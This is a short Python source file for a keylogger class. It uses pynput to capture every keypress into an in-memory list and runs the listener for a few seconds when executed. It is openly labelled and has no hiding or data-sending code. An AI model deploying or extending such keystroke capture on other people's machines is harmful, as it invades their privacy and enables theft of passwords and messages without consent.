import time

from pynput.keyboard import Listener
from InterFace import KeyLoggerSystem

class KeyLogger(KeyLoggerSystem):
    def __init__(self):
        self.logged_keys = []
        self.listener = None


    def on_press(self, key):
        try:
            self.logged_keys.append(key.char)
        except:
            self.logged_keys.append(str(key))

    def start_listening(self):
        print("start listen")
        self.listener = Listener(on_press = self.on_press)
        self.listener.start()


    def stop_listening(self):
        if self.listener:
            self.listener.stop()


if __name__ == '__main__':
    kl = KeyLogger()
    kl.start_listening()
    time.sleep(4)

